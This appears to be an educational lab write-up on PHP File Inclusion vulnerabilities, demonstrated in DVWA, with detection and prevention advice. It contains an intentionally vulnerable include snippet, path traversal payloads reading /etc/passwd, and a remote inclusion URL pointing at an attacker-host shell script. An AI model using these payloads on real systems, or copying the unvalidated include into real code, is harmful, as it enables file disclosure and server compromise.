# File Inclusion Attacks

## Objective

To understand and demonstrate File Inclusion vulnerabilities using DVWA and learn how improper handling of file input can allow attackers to access unauthorized files or execute malicious code.

---

## What are File Inclusion Attacks?

File Inclusion is a web application vulnerability that occurs when an application includes files based on user-supplied input without proper validation. Attackers can manipulate the file path to access sensitive files or execute malicious code.

File Inclusion vulnerabilities are commonly found in web applications developed using PHP and other server-side scripting languages.

---

## Types of File Inclusion Attacks

### 1. Local File Inclusion (LFI)

Local File Inclusion allows attackers to include files that already exist on the server.

**Example:**

```php
<?php
include($_GET['page']);
?>
```

URL:

```html
http://example.com/index.php?page=about.php
```

An attacker may modify the parameter to access sensitive files:

```html
http://example.com/index.php?page=../../../../etc/passwd
```

This may reveal system information and sensitive data.

---

### 2. Remote File Inclusion (RFI)

Remote File Inclusion occurs when an application allows files from external servers to be included and executed.

**Example:**

```html
http://example.com/index.php?page=http://attacker.com/shell.php
```

If remote file inclusion is enabled, the malicious file may execute on the target server.

---

## How File Inclusion Works

1. Application accepts a filename from user input.
2. Input is passed directly to an include function.
3. No validation or filtering is applied.
4. Attacker manipulates the file path.
5. Sensitive files are disclosed or malicious code is executed.

---

## Impact of File Inclusion Attacks

* Unauthorized access to sensitive files
* Disclosure of system configuration files
* Exposure of application source code
* Credential theft
* Remote code execution (RFI)
* Complete server compromise

---

## File Inclusion in DVWA

DVWA contains a File Inclusion module that demonstrates Local File Inclusion vulnerabilities.

### Environment

* Attacker Machine: Kali Linux
* Target Application: DVWA
* Web Server: Apache
* Database: MariaDB/MySQL
* Security Level: Low

### Demonstration

A vulnerable page may use a URL such as:

```html
http://localhost/DVWA/vulnerabilities/fi/?page=file1.php
```

By manipulating the parameter, an attacker can attempt directory traversal:

```html
http://localhost/DVWA/vulnerabilities/fi/?page=../../../../etc/passwd
```

If successful, the contents of sensitive files may be displayed.

---

## Attack Process

1. Identify file inclusion parameters.
2. Test for directory traversal sequences (`../`).
3. Attempt access to sensitive files.
4. Analyze application responses.
5. Extract useful information or gain further access.

---

## Detection Methods

* Manual security testing
* Source code review
* Vulnerability scanners
* Penetration testing
* Monitoring unusual file access requests

---

## Prevention Techniques

### Input Validation

Allow only predefined file names.

```php
$allowed = ["home.php", "about.php"];
```

### Use Whitelisting

Load only approved files instead of user-supplied paths.

### Disable Remote File Inclusion

Disable unnecessary PHP settings such as:

```ini
allow_url_include = Off
allow_url_fopen = Off
```

### Restrict File Permissions

Apply the principle of least privilege.

### Secure Coding Practices

Avoid directly using user input in file inclusion functions.

---

## Results

The DVWA File Inclusion module demonstrates how improper validation of file paths can allow attackers to access sensitive files. At the Low Security Level, Local File Inclusion vulnerabilities are easily exploitable, highlighting the importance of secure file handling.

---

## Conclusion

File Inclusion vulnerabilities can lead to sensitive information disclosure, remote code execution, and complete server compromise. Proper input validation, whitelisting, secure server configuration, and secure coding practices are essential to protect web applications from File Inclusion attacks.
